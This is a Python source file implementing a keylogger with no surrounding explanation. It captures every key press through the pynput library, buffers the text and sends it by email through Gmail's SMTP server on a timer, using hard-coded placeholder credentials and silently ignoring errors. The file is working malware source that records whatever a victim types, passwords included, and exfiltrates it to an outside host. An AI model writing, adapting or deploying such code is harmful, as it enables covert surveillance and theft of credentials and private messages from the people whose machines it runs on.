from pynput import keyboard
import re
import threading
import smtplib

class Keylogger:
    def __init__(self, interval, email, email_password):
        self.words = ""
        self.email = email
        self.email_password = email_password
        self.interval = interval
        self.start()
    
    def append_words(self, string):
        self.words = self.words + string
    
    def process_keys(self, key):
        global words
        nkey = re.sub("'", "", str(key))

        if key == keyboard.Key.space:
            self.append_words(" ")
        elif re.match("\\W\\w", nkey):
            self.append_words(f"{nkey} ASCII Control code")
        elif re.match("^Key\.", nkey):
            nkey = nkey[3:]
            if nkey == "up" or nkey == "down" or nkey == "left" or nkey == "right":
                self.append_words(f"{nkey} arrow")
        else:
            self.append_words(nkey)           

    def reporter(self):
        if len(self.words) > 0:
            self.send_to_email()
            self.words = ""
        else:
            pass
        time = threading.Timer(self.interval, self.reporter)
        time.start()
   
    def send_to_email(self):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(self.email, self.email_password) 
            server.sendmail(self.email, self.email, "\n\n" + self.words)
        except:
            pass

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.process_keys)
        with keyboard_listener:
            self.reporter()
            keyboard_listener.join()


Keylogger(10, "foo@bar.com", "foo")


